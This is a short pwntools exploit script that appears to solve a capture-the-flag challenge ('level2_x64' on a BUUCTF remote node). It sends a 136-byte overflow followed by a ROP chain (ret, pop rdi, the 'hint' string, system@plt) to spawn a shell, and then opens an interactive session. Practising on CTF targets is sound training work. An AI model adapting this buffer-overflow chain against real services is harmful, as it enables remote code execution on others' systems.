from pwn import *

context.log_level = "debug"

exe = ELF("./level2_x64")
# r = exe.process()
r = remote("node4.buuoj.cn", 27501)
# 0x00000000004006b3: pop rdi; ret;
# 0x00000000004004a1: ret;
pop_rdi = p64(0x4006B3)
ret = p64(0x4004A1)

r.recvuntil(b":\n")
r.send(cyclic(136) + ret + pop_rdi + p64(exe.sym["hint"]) + p64(exe.plt["system"]))
r.interactive()
